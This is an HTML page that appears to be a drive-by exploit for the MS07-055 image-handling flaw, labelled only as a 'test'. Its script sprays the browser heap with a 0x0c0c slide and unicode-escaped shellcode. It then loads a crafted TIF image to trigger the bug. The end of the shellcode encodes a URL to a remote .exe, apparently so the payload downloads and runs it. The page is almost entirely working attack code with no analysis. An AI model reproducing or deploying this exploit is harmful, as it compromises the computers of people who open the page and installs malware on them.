<html>
<head>
<title>MS07-055 test</title>
<script language="JavaScript">
var memory = new Array();
function getSpraySlide(spraySlide, spraySlideSize)
{
	while (spraySlide.length*2<spraySlideSize)
	{
		spraySlide += spraySlide;
	}
	spraySlide = spraySlide.substring(0,spraySlideSize/2);
	return spraySlide;
}
function makeSlide()
{
var heapSprayToAddress = 0x0c0c0c0c;
   var payLoadCode = unescape("%u9090" +"%u6090"+
"%u17eb%u645e%u30a1%u0000%u0500%u0800%u0000%uf88b" +
"%u00b9%u0004%uf300%uffa4%ue8e0%uffe4%uffff%ua164" +
"%u0030%u0000%u408b%u8b0c%u1c70%u8bad%u0870%uec81" +
"%u0200%u0000%uec8b%ue8bb%u020f%u8b00%u8503%u0fc0" +
"%ubb85%u0000%uff00%ue903%u0221%u0000%u895b%u205d" +
"%u6856%ufe98%u0e8a%ub1e8%u0000%u8900%u0c45%u6856" +
"%u4e8e%uec0e%ua3e8%u0000%u8900%u0445%u6856%u79c1" +
"%ub8e5%u95e8%u0000%u8900%u1c45%u6856%uc61b%u7946" +
"%u87e8%u0000%u8900%u1045%u6856%ufcaa%u7c0d%u79e8" +
"%u0000%u8900%u0845%u6856%u84e7%ub469%u6be8%u0000" +
"%u8900%u1445%ue0bb%u020f%u8900%u3303%uc7f6%u2845" +
"%u5255%u4d4c%u45c7%u4f2c%u004e%u8d00%u285d%uff53" +
"%u0455%u6850%u1a36%u702f%u3fe8%u0000%u8900%u2445" +
"%u7f6a%u5d8d%u5328%u55ff%uc71c%u0544%u5c28%u652e" +
"%uc778%u0544%u652c%u0000%u5600%u8d56%u287d%uff57" +
"%u2075%uff56%u2455%u5756%u55ff%ue80c%u0062%u0000" +
"%uc481%u0200%u0000%u3361%uc2c0%u0004%u8b55%u51ec" +
"%u8b53%u087d%u5d8b%u560c%u738b%u8b3c%u1e74%u0378" +
"%u56f3%u768b%u0320%u33f3%u49c9%uad41%uc303%u3356" +
"%u0ff6%u10be%uf23a%u0874%ucec1%u030d%u40f2%uf1eb" +
"%ufe3b%u755e%u5ae5%ueb8b%u5a8b%u0324%u66dd%u0c8b" +
"%u8b4b%u1c5a%udd03%u048b%u038b%u5ec5%u595b%uc25d" +
"%u0008%u92e9%u0000%u5e00%u80bf%u020c%ub900%u0100" +
"%u0000%ua4f3%uec81%u0100%u0000%ufc8b%uc783%uc710" +
"%u6e07%u6474%uc76c%u0447%u006c%u0000%uff57%u0455" +
"%u4589%uc724%u5207%u6c74%uc741%u0447%u6c6c%u636f" +
"%u47c7%u6108%u6574%uc748%u0c47%u6165%u0070%u5057" +
"%u55ff%u8b08%ub8f0%u0fe4%u0002%u3089%u07c7%u736d" +
"%u6376%u47c7%u7204%u0074%u5700%u55ff%u8b04%u3c48" +
"%u8c8b%u8008%u0000%u3900%u0834%u0474%uf9e2%u12eb" +
"%u348d%u5508%u406a%u046a%uff56%u1055%u06c7%u0c80" +
"%u0002%uc481%u0100%u0000%ue8c3%uff69%uffff%u048b" +
"%u5324%u5251%u5756%uecb9%u020f%u8b00%u8519%u75db" +
"%u3350%u33c9%u83db%u06e8%ub70f%u8118%ufffb%u0015" +
"%u7500%u833e%u06e8%ub70f%u8118%ufffb%u0035%u7500" +
"%u8330%u02e8%ub70f%u8318%u6afb%u2575%uc083%u8b04" +
"%ub830%u0fe0%u0002%u0068%u0000%u6801%u1000%u0000" +
"%u006a%u10ff%u0689%u4489%u1824%uecb9%u020f%uff00" +
"%u5f01%u5a5e%u5b59%ue4b8%u020f%uff00%ue820%ufdda" +
"%uffff
%u7468%u7074%u2F3A%u772F%u7777%u312E%u3332%u632E%u6D6F%u312F%u652E%u6578");
var heapBlockSize = 0x400000;
var payLoadSize = payLoadCode.length * 2;
var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
var spraySlide = unescape("%u0c0c%u0c0c");
	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
	for (i=0;i<heapBlocks;i++) {
		memory[i] = spraySlide + payLoadCode;
	}
	return 0;
}
makeSlide();
</script>
</head>
<body>
<img src="ms07-055.tif">
</body>
</html>

